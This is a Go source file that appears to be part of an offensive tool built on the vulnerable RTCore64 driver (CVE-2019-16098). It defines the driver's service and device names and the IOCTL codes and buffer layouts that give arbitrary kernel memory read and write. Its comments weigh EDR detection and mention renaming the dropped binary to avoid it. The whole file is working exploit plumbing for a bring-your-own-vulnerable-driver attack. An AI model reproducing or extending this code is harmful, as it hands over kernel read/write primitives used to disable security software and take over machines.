package rtcore64

// ServiceName is the SCM key under which RTCore64 is registered. EDR
// vendors hard-code this name in their detections — callers can rename
// the dropped binary, but the IOCTL device name (\Device\RTCore64) and
// the service name match across every public PoC of CVE-2019-16098.
const ServiceName = "RTCore64"

// DevicePath is the DOS device the driver creates (\\.\RTCore64). Used
// by the user-mode Reader/Writer to issue IOCTLs.
const DevicePath = `\\.\RTCore64`

// IOCTL codes for the arbitrary-memory primitives. RTCore64 exposes a
// generic "process IO" entry that branches on the input buffer's first
// dword; these two codes are the well-documented memory-bus path.
const (
	// IoctlRead = read N bytes from a virtual address. Input layout:
	//   [0..7]   src VA (uint64)
	//   [8..11]  length (uint32)
	//   [12..15] reserved (set to 0)
	// Output: buffer of `length` bytes filled with the read result.
	IoctlRead = 0x80002048

	// IoctlWrite = write N bytes to a virtual address. Input layout
	// mirrors IoctlRead with the source bytes appended after the
	// header.
	IoctlWrite = 0x8000204C
)

// MaxPrimitiveBytes caps a single IOCTL transfer at 4 KiB. Larger
// reads/writes loop in the Reader/Writer wrappers — RTCore64 itself
// does not enforce a hard limit, but kernel transfers above one page
// are unstable in the wild.
const MaxPrimitiveBytes = 4096
